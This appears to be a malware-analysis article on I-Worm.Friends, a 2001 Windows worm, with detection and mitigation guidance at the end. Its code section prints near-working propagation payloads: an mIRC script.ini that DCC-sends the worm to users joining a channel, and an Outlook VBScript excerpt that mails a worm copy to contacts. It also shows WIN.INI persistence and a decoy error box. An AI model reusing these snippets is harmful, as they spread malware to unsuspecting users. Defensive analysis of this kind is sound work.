# Dissecting I‑Worm.Friends: An Assembly Worm Orchestrating VBS + mIRC + Outlook 🛠️🔍

## Disclaimer
This article is for educational purposes only. The code and techniques discussed should not be used for malicious purposes.

## Introduction
I‑Worm.Friends (dated May 2001) is a Windows worm written in 32‑bit assembly that chains multiple legacy components: it installs persistence, drops a VBScript emailer, hijacks mIRC via script.ini for peer‑to‑peer spread, and displays social‑engineering message boxes. Instead of exploits or packing, it uses Win32 APIs directly (Kernel32, Advapi32, User32) to copy files, write to WIN.INI, modify registry values, and spawn helper scripts.

Understanding this specimen is valuable because it illustrates a common early‑2000s pattern: a small native stub that plants script‑based propagators (VBScript) and messaging hooks (mIRC), while leveraging the system’s own startup configuration (WIN.INI [windows] run=) to persist. The combination of deterministic API calls and fixed strings yields reliable detection points that remain relevant for retrospective analysis and legacy system defense.

## Overview of the Malware 🐛
I‑Worm.Friends pursues three core goals: establish startup execution, spread through social channels, and add cosmetic artifacts that hint at legitimacy or author attribution.

- Persistence: Copies itself to %System% as Iesetup.exe and writes WIN.INI [windows] run entries to execute on boot. It also modifies RegisteredOwner and RegisteredOrganization under HKLM\Software\Microsoft\Windows\CurrentVersion.
- Email propagation: Creates C:\Friends\maya.vbs containing an Outlook automation script that sends an attachment named NetFriends.exe (a copy of the worm) to address book contacts with the subject “Would you like a Net Friend ?”. The worm then launches the script with WinExec to trigger emailing.
- IRC propagation: Writes a minimal mIRC script.ini that auto‑DCC sends the %System% copy to users joining a channel.
- Social engineering and noise: Shows a fake “WinZip Self‑Extractor header corrupt” error, and on the 5th day of each month pops a credit message box.

Targets are consumer Windows installations where WIN.INI is still honored and mIRC/Outlook are present. The worm relies on user environments rather than exploits, making it fragile but effective in permissive setups.

## Source Code Analysis 🔬
The program imports a small set of Win32 APIs for filesystem, process, and registry operations. Control flow follows labeled blocks: PREPAR (build target paths), FILE (generate mIRC payload file), MIRC (copy to mIRC locations), EMAIL (create VBS and directory), ENVOIE (launch VBS), COPIE (self‑copy to system), WIN_INI (autorun), MESS (WinZip decoy), BDR (registry edits), DATE (monthly message), FIN (exit).

### Building Key Paths and mIRC Payload
```asm
; Build %System%\Iesetup.exe into szCopie
push 50
push offset szCopie
call GetSystemDirectoryA
push offset Copie               ; "\\Iesetup.exe"
push offset szCopie
call lstrcat
```
- szCopie becomes the absolute path to the persistence payload in the System directory.

```asm
; Create a file in %WinDir% named "\\petik" and write mIRC script data
call GetWindowsDirectoryA
lstrcat(szPTK, "\\petik")
CreateFileA(szPTK, GENERIC_WRITE, FILE_SHARE_READ, ..., CREATE_NEW, ...)
WriteFile(FileHandle, petikd, PETIKTAILLE)
```
- petikd is an embedded text blob representing mIRC’s script.ini content:
```asm
petikd db "[script]",0Dh,0Ah
      db "n0=on 1:JOIN:#:{",0Dh,0Ah
      db "n1= /if ( $nick == $me ) { halt }",0Dh,0Ah
      db "n2= /.dcc send $nick "
 szCopie db 50 dup(0)   ; buffer that gets filled earlier
      db "",0Dh,0Ah
      db "n3=}",0
```
- Because szCopie is adjacent in the data blob and is populated before WriteFile, the resulting file in %WinDir% contains a complete mIRC script line that DCC‑sends the worm’s %System% path.

```asm
; Copy the created file to typical mIRC locations
CopyFileA(szPTK, "C:\\mirc\\script.ini", FALSE)
CopyFileA(szPTK, "C:\\mirc32\\script.ini", FALSE)
```
- If mIRC is installed in standard folders, this hijacks auto‑events to spread via DCC on channel JOIN.

### Dropping the VBScript Emailer
```asm
CreateDirectoryA("C:\\Friends", ...)
CreateFileA("C:\\Friends\\maya.vbs", GENERIC_WRITE, ..., CREATE_ALWAYS, ...)
WriteFile(FileHandle, mayad, MAYATAILLE)
```
- The embedded VBScript (excerpted safely) automates Outlook:
```vb
' maya.vbs (excerpt – inert for analysis)
Set fso = CreateObject("Scripting.FileSystemObject")
fso.CopyFile fso.GetSpecialFolder(1) & "\Iesetup.exe", _
              fso.GetSpecialFolder(1) & "\NetFriends.exe"
Set K = CreateObject("Outlook.Application")
Set L = K.GetNameSpace("MAPI")
' ... iterate address lists ...
Set N = K.CreateItem(0)
N.Subject = "Would you like a Net Friend ?"
N.Body = "Look at this zip file to find a Net Friend"
N.Attachments.Add fso.BuildPath(fso.GetSpecialFolder(1), "NetFriends.exe")
If N.To <> "" Then N.Send
```
- The script clones the system copy to NetFriends.exe, constructs a message, and attaches the clone. The surrounding loop intends to iterate address entries; in the embedded string, the loop structure is partially abbreviated but conveys intent.

```asm
; Launch the VBScript via WinExec
WinExec("wscript C:\\Friends\\maya.vbs", SW_SHOWNORMAL)
```
- Spawns the script to perform emailing without user interaction.

### Self‑Copy, WIN.INI Run, and Decoy UI
```asm
GetModuleFileNameA(NULL, szOrig, 50)
CopyFileA(szOrig, szCopie, FALSE)     ; -> %System%\Iesetup.exe
```
- Establishes a stable copy under a legitimate‑sounding name.

```asm
; Append "\\WIN.INI" to %WinDir% and write run entry
GetWindowsDirectoryA(szWin, 80)
lstrcat(szWin, "\\WIN.INI")
WritePrivateProfileStringA("windows", "run", szCopie, szWin)
```
- Uses the legacy WIN.INI [windows] run mechanism to ensure execution at startup.

```asm
; Fake error to mask activity
MessageBoxA(0, "WinZip Self-Extractor header corrupt...", "WinZip Self-Extractor", 0x10)
```
- Presents a plausible error to distract the user.

### Registry Modifications and Time‑based Message
```asm
RegOpenKeyExA(HKLM, "Software\\Microsoft\\Windows\\CurrentVersion", ..., &RegHandle)
RegSetValueExA(RegHandle, "RegisteredOwner", REG_SZ, "Maya, Laurent, Etienne", ...)
RegSetValueExA(RegHandle, "RegisteredOrganization", REG_SZ, "PetiK Corporation", ...)
RegCloseKey(RegHandle)
```
- Cosmetic system metadata changes, sometimes used as author tags.

```asm
GetSystemTime &SystemTime
cmp [SystemTime.wDay], 5
jne FIN
MessageBoxA(0, "Coded by PetiK (c)2001...", "I-Worm.Friends", 0x40)
```
- On the 5th of any month, displays an informational message box.

## Mitigation and Defense Strategies 🛡️
- Constrain script execution: Disable or restrict Windows Script Host (wscript.exe/cscript.exe) for standard users via AppLocker/WDAC. Where scripts are necessary, require signatures and trusted paths.
- Email client hardening: Enforce prompts/blocks on Outlook object model automation. Monitor for processes rapidly creating items and adding executable attachments, especially NetFriends.exe or Iesetup.exe paths from System directories.
- IRC controls: If mIRC is allowed, watch for unexpected creation/modification of script.ini under C:\mirc or C:\mirc32. Disable DCC auto‑send in client policy and block DCC at network egress where possible.
- Legacy persistence hygiene: Audit for WIN.INI [windows] run entries and prefer modern Run/RunOnce policies with baselines. Flag any run values pointing to %System%\Iesetup.exe.
- Registry telemetry: Alert on writes to HKLM\Software\Microsoft\Windows\CurrentVersion values RegisteredOwner/RegisteredOrganization from non‑trusted processes; such changes are rare and often cosmetic indicators.
- File IOCs and artifacts: Hunt for C:\Friends\maya.vbs, %WinDir%\petik (text mIRC payload), %System%\Iesetup.exe, and C:\mirc*\script.ini containing “ON 1:JOIN” and “/dcc send $nick”.
- Least privilege and application control: Running as standard user limits writes to system directories and HKLM, reducing the worm’s impact. Use allow‑listing to block unknown binaries from writing into mIRC folders and System32.
- EDR detections: Build behavior rules for CreateFileA/CopyFileA into System32 followed by WritePrivateProfileStringA to WIN.INI, coupled with WinExec launching wscript with an on‑disk VBS dropper.

## Conclusion
I‑Worm.Friends exemplifies a multi‑vector worm from the early 2000s: an assembly stub that plants a VBScript emailer, hijacks mIRC for DCC spreading, and persists via legacy WIN.INI mechanisms while displaying plausible UI messages. Although it lacks modern stealth or exploitation, its reliance on client automation and predictable file/registry artifacts makes it effective in permissive environments and easy to triage. Defenders can neutralize this class of malware by hardening script execution, restricting email/IRC automation, monitoring legacy persistence points, and hunting for the specific strings and file paths embedded in the sample. On legacy systems that must remain operational, layered controls and IOC‑driven response are essential to reduce dwell time and prevent further spread.
